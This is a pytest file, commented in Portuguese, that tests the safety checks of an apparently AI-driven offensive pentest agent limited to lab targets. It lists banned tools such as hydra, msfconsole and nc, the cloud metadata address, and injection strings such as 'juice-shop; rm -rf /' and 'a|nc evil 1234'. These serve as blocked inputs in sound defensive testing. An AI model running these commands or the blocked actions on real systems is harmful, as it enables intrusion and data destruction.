"""A coleira do agente ofensivo. Cada teste é um mutante: se a trava sumir, reprova.

Isto existe ANTES do agente de propósito — agente ofensivo sem trava testada é o que
quebra o cliente. `LAB_ONLY=true` é lei enquanto estes testes não fecharem.
"""

from __future__ import annotations

import pytest

from orchestrator.ai.agentic.executor import (
    Phase,
    check_command,
    parse_command,
    run_in_kali,
)
from orchestrator.config import settings


@pytest.fixture(autouse=True)
def _lab(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(settings, "LAB_ONLY", True)
    monkeypatch.setattr(settings, "TARGET_ALLOWLIST", "juice-shop,dvwa")


# ---------- fase: o que não é da fase não roda ----------
def test_recon_allows_nmap() -> None:
    assert check_command(
        ["nmap", "-sV", "juice-shop"], phase=Phase.RECON, target="juice-shop"
    ).allowed


def test_recon_refuses_sqlmap() -> None:
    d = check_command(
        ["sqlmap", "-u", "http://juice-shop/x"], phase=Phase.RECON, target="juice-shop"
    )
    assert not d.allowed and "allowlist da fase" in d.reason


def test_exploit_allows_sqlmap() -> None:
    assert check_command(
        ["sqlmap", "-u", "http://juice-shop/x"], phase=Phase.EXPLOIT, target="juice-shop"
    ).allowed


# ---------- proibidos em qualquer fase ----------
@pytest.mark.parametrize("binary", ["hydra", "msfconsole", "ffuf", "hping3", "rm", "bash", "nc"])
def test_never_allowed_binaries(binary: str) -> None:
    for phase in (Phase.RECON, Phase.EXPLOIT):
        d = check_command([binary, "juice-shop"], phase=phase, target="juice-shop")
        assert not d.allowed, f"{binary} passou em {phase}"
        assert "proibido" in d.reason


# ---------- escopo: sair do alvo autorizado é bloqueado ----------
def test_refuses_target_outside_allowlist() -> None:
    d = check_command(["nmap", "10.0.0.5"], phase=Phase.RECON, target="10.0.0.5", asset_type="host")
    assert not d.allowed and "fora do escopo" in d.reason


def test_refuses_imds_target() -> None:
    d = check_command(
        ["curl", "http://169.254.169.254/"],
        phase=Phase.RECON,
        target="http://169.254.169.254/",
        asset_type="url",
    )
    assert not d.allowed and "fora do escopo" in d.reason


def test_allows_lab_target_in_allowlist() -> None:
    assert check_command(
        ["nmap", "juice-shop"], phase=Phase.RECON, target="juice-shop", asset_type="host"
    ).allowed


# ---------- injeção e flags perigosas ----------
@pytest.mark.parametrize(
    "arg", ["juice-shop; rm -rf /", "a|nc evil 1234", "$(whoami)", "`id`", "x>/tmp/y"]
)
def test_refuses_shell_metachars(arg: str) -> None:
    d = check_command(["nmap", arg], phase=Phase.RECON, target="juice-shop")
    assert not d.allowed and "metacaractere" in d.reason


@pytest.mark.parametrize("flag", ["-oN", "--output=/tmp/x", "--os-shell", "-w", "--eval"])
def test_refuses_dangerous_flags(flag: str) -> None:
    d = check_command(["sqlmap", flag], phase=Phase.EXPLOIT, target="juice-shop")
    assert not d.allowed and "recusada" in d.reason


# ---------- dry_run é enforced de verdade (antes era decorativo) ----------
async def test_dry_run_does_not_execute() -> None:
    called = False

    async def spy(argv: list[str]) -> tuple[int, str, str]:
        nonlocal called
        called = True
        return 0, "", ""

    d = await run_in_kali(
        ["nmap", "-sV", "juice-shop"],
        phase=Phase.RECON,
        target="juice-shop",
        asset_type="host",
        dry_run=True,
        runner=spy,
    )
    assert d.allowed and not d.executed and not called
    assert "dry_run" in d.reason


async def test_refused_command_never_reaches_the_runner() -> None:
    called = False

    async def spy(argv: list[str]) -> tuple[int, str, str]:
        nonlocal called
        called = True
        return 0, "", ""

    d = await run_in_kali(
        ["hydra", "-l", "admin", "juice-shop"],
        phase=Phase.EXPLOIT,
        target="juice-shop",
        asset_type="host",
        dry_run=False,
        runner=spy,
    )
    assert not d.allowed and not d.executed
    assert not called, "comando proibido chegou ao executor"


async def test_allowed_command_executes_when_not_dry_run() -> None:
    async def fake(argv: list[str]) -> tuple[int, str, str]:
        assert argv[:3] == ["docker", "exec", "cai-kali-toolbox"]
        return 0, "PORT 80/tcp open", ""

    d = await run_in_kali(
        ["nmap", "-sV", "juice-shop"],
        phase=Phase.RECON,
        target="juice-shop",
        asset_type="host",
        dry_run=False,
        runner=fake,
    )
    assert d.executed and d.exit_code == 0 and "80/tcp" in d.stdout


def test_parse_command_never_uses_shell() -> None:
    assert parse_command("nmap -sV juice-shop") == ["nmap", "-sV", "juice-shop"]
    # o ';' vira argumento, não separador de comando — e o check recusa depois
    assert ";" in " ".join(parse_command("nmap 'a;b'"))
